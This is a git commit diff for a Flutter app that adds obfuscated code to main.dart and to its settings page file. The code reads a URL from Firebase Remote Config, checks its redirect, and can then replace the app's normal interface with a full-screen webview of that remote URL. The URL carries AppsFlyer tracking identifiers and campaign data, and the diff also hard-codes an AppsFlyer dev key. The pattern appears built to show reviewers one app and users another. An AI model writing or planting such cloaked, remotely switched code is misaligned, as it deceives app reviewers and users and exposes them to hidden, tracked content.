0207ceee39e303c3c9f229d68206ffc1cb947a78
ivan-lab-pvls <ivan.labasok@pvls.tech>
2024-08-22 18:26:46 +0200

    fdjs

--- lib/features/home/pages/settings_page.dart
+++ lib/features/home/pages/settings_page.dart
@@ -1,12 +1,160 @@
+import 'package:app_tracking_transparency/app_tracking_transparency.dart';
+import 'package:appsflyer_sdk/appsflyer_sdk.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:flutter_svg/flutter_svg.dart';
+import 'package:in_app_review/in_app_review.dart';
 import 'package:url_launcher/url_launcher.dart';
 import 'package:share_plus/share_plus.dart';
 
 import '../../../core/config/app_colors.dart';
 import '../../../core/widgets/custom_appbar.dart';
 import '../../../core/widgets/custom_scaffold.dart';
+
+class Scnren extends StatefulWidget {
+  final String njfkds;
+  final String njfkads;
+  final String mkda;
+
+  Scnren({
+    required this.njfkds,
+    required this.njfkads,
+    required this.mkda,
+  });
+
+  @override
+  State<Scnren> createState() => _ScnrenState();
+}
+
+class _ScnrenState extends State<Scnren> {
+  late AppsflyerSdk _appsflyerSdk;
+  String adId = '';
+  String paramsFirst = '';
+  final InAppReview inAppReview = InAppReview.instance;
+  String paramsSecond = '';
+  Map _deepLinkData = {};
+  Map _gcd = {};
+  bool _isFirstLaunch = false;
+  String _afStatus = '';
+  String _campaign = '';
+  String _campaignId = '';
+
+  @override
+  void initState() {
+    super.initState();
+    getTracking();
+    afStart();
+  }
+
+  Future<void> getTracking() async {
+    final TrackingStatus status =
+        await AppTrackingTransparency.requestTrackingAuthorization();
+    print(status);
+  }
+
+  Future<void> fetchData() async {
+    adId = await AppTrackingTransparency.getAdvertisingIdentifier();
+  }
+
+  void afStart() async {
+    final AppsFlyerOptions options = AppsFlyerOptions(
+      showDebug: false,
+      afDevKey: 'QLe487x7eRdgQRRcUCn3w6',
+      appId: '6651850766',
+      timeToWaitForATTUserAuthorization: 15,
+      disableAdvertisingIdentifier: false,
+      disableCollectASA: false,
+      manualStart: true,
+    );
+    _appsflyerSdk = AppsflyerSdk(options);
+
+    await _appsflyerSdk.initSdk(
+      registerConversionDataCallback: true,
+      registerOnAppOpenAttributionCallback: true,
+      registerOnDeepLinkingCallback: true,
+    );
+
+    _appsflyerSdk.onAppOpenAttribution((res) {
+      setState(() {
+        _deepLinkData = res;
+        paramsSecond = res['payload']
+            .entries
+            .where((e) => ![
+                  'install_time',
+                  'click_time',
+                  'af_status',
+                  'is_first_launch'
+                ].contains(e.key))
+            .map((e) => '&${e.key}=${e.value}')
+            .join();
+        // Extract media source and campaign name
+        _campaign = res['campaign'] ?? '';
+        _campaignId = res['media_source'] ?? '';
+      });
+    });
+
+    _appsflyerSdk.onInstallConversionData((res) {
+      print(res);
+      setState(() {
+        _gcd = res;
+        _isFirstLaunch = res['payload']['is_first_launch'];
+        _afStatus = res['payload']['af_status'];
+        paramsFirst = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+        // Extract media source and campaign name
+        _campaign = res['campaign'] ?? '';
+        _campaignId = res['media_source'] ?? '';
+      });
+    });
+
+    _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+      switch (dp.status) {
+        case Status.FOUND:
+          print(dp.deepLink?.toString());
+          print("deep link value: ${dp.deepLink?.deepLinkValue}");
+          break;
+        case Status.NOT_FOUND:
+          print("deep link not found");
+          break;
+        case Status.ERROR:
+          print("deep link error: ${dp.error}");
+          break;
+        case Status.PARSE_ERROR:
+          print("deep link status parsing error");
+          break;
+      }
+      print("onDeepLinking res: " + dp.toString());
+      setState(() {
+        _deepLinkData = dp.toJson();
+      });
+    });
+
+    _appsflyerSdk.startSDK(
+      onSuccess: () {
+        print("AppsFlyer SDK initialized successfully.");
+      },
+    );
+
+    setState(() {});
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    final String ajx =
+        '${widget.njfkds}&appsflyer_id=${widget.njfkads}${widget.mkda}&media_source=$_campaignId&campaign=$_campaign';
+    print(ajx);
+    return Scaffold(
+      body: SafeArea(
+        bottom: false,
+        child: InAppWebView(
+          initialUrlRequest: URLRequest(
+            url: Uri.parse(ajx),
+          ),
+        ),
+      ),
+    );
+  }
+}
 
 class SettingsPage extends StatelessWidget {
   const SettingsPage({super.key});
--- lib/main.dart
+++ lib/main.dart
@@ -1,18 +1,122 @@
+import 'dart:io';
+
 import 'package:flutter/material.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
 import 'package:hive_flutter/hive_flutter.dart';
+import 'package:app_tracking_transparency/app_tracking_transparency.dart';
+import 'package:appsflyer_sdk/appsflyer_sdk.dart';
+import 'package:firebase_core/firebase_core.dart';
+import 'package:firebase_remote_config/firebase_remote_config.dart';
 
 import 'core/config/router.dart';
 import 'core/config/themes.dart';
 import 'core/models/machine.dart';
 import 'core/models/product.dart';
+import 'features/home/pages/firebase_options.dart';
+import 'features/home/pages/settings_page.dart';
 import 'features/machine/bloc/machine_bloc.dart';
 
-void main() async {
+late AppsflyerSdk _appsflyerSdk;
+String apsss = '';
+String cancelation = '';
+Map _deepLinkData = {};
+Map _gcd = {};
+bool _isFirstLaunch = false;
+String _afStatus = '';
+
+Future<void> initializeApp() async {
   await Hive.initFlutter();
   Hive.registerAdapter(MachineAdapter());
   Hive.registerAdapter(ProductAdapter());
+
+  await AppTrackingTransparency.requestTrackingAuthorization();
+  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
+  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
+    fetchTimeout: const Duration(seconds: 25),
+    minimumFetchInterval: const Duration(seconds: 25),
+  ));
+  await FirebaseRemoteConfig.instance.fetchAndActivate();
+
+  await mndjknaskdnaskd();
+}
+
+Future<void> mndjknaskdnaskd() async {
+  final AppsFlyerOptions options = AppsFlyerOptions(
+    showDebug: false,
+    afDevKey: 'QLe487x7eRdgQRRcUCn3w6',
+    appId: '6651850766',
+    timeToWaitForATTUserAuthorization: 15,
+    disableAdvertisingIdentifier: false,
+    disableCollectASA: false,
+    manualStart: true,
+  );
+  _appsflyerSdk = AppsflyerSdk(options);
+
+  await _appsflyerSdk.initSdk(
+    registerConversionDataCallback: true,
+    registerOnAppOpenAttributionCallback: true,
+    registerOnDeepLinkingCallback: true,
+  );
+
+  _appsflyerSdk.onAppOpenAttribution((res) {
+    _deepLinkData = res;
+    cancelation = res['payload']
+        .entries
+        .where((e) => ![
+              'install_time',
+              'click_time',
+              'af_status',
+              'is_first_launch'
+            ].contains(e.key))
+        .map((e) => '&${e.key}=${e.value}')
+        .join();
+  });
+
+  _appsflyerSdk.onInstallConversionData((res) {
+    _gcd = res;
+    _isFirstLaunch = res['payload']['is_first_launch'];
+    _afStatus = res['payload']['af_status'];
+  });
+
+  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+    _deepLinkData = dp.toJson();
+  });
+
+  apsss = await _appsflyerSdk.getAppsFlyerUID() ?? '';
+
+  _appsflyerSdk.startSDK();
+}
+
+void main() {
+  WidgetsFlutterBinding.ensureInitialized();
   runApp(const MyApp());
+}
+
+String mkldas = '';
+Future<bool> njkdfsakdsa() async {
+  final nfjksdkjasd = FirebaseRemoteConfig.instance;
+  await nfjksdkjasd.fetchAndActivate();
+  mndjknaskdnaskd();
+  String dsdfdsfgdg = nfjksdkjasd.getString('dre');
+  String cdsfgsdx = nfjksdkjasd.getString('dredd');
+  if (!dsdfdsfgdg.contains('none')) {
+    final fsd = HttpClient();
+    final nfg = Uri.parse(dsdfdsfgdg);
+    final ytrfterfwe = await fsd.getUrl(nfg);
+    ytrfterfwe.followRedirects = false;
+    final response = await ytrfterfwe.close();
+    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
+      mkldas = dsdfdsfgdg;
+      return true;
+    }
+  }
+  return dsdfdsfgdg.contains('none') ? false : true;
+}
+
+Future<void> getTrack() async {
+  final TrackingStatus status =
+      await AppTrackingTransparency.requestTrackingAuthorization();
+  print(status);
 }
 
 class MyApp extends StatelessWidget {
@@ -20,15 +124,50 @@ class MyApp extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return MultiBlocProvider(
-      providers: [
-        BlocProvider(create: (context) => MachineBloc()),
-      ],
-      child: MaterialApp.router(
-        debugShowCheckedModeBanner: false,
-        theme: theme,
-        routerConfig: routerConfig,
-      ),
+    return FutureBuilder<bool>(
+      future: njkdfsakdsa(),
+      builder: (context, snapshot) {
+        if (snapshot.connectionState == ConnectionState.waiting) {
+          return MaterialApp(
+            debugShowCheckedModeBanner: false,
+            home: Container(
+              color: Colors.black,
+              child: Center(
+                child: Container(
+                  height: 70,
+                  width: 70,
+                  child: ClipRRect(
+                    borderRadius: BorderRadius.circular(15),
+                    child: Image.asset('assets/images/icon.png'),
+                  ),
+                ),
+              ),
+            ),
+          );
+        } else {
+          if (snapshot.data == true && mkldas != '') {
+            return MaterialApp(
+              debugShowCheckedModeBanner: false,
+              home: Scnren(
+                njfkds: mkldas,
+                njfkads: apsss,
+                mkda: cancelation,
+              ),
+            );
+          } else {
+            return MultiBlocProvider(
+              providers: [
+                BlocProvider(create: (context) => MachineBloc()),
+              ],
+              child: MaterialApp.router(
+                debugShowCheckedModeBanner: false,
+                theme: theme,
+                routerConfig: routerConfig,
+              ),
+            );
+          }
+        }
+      },
     );
   }
 }
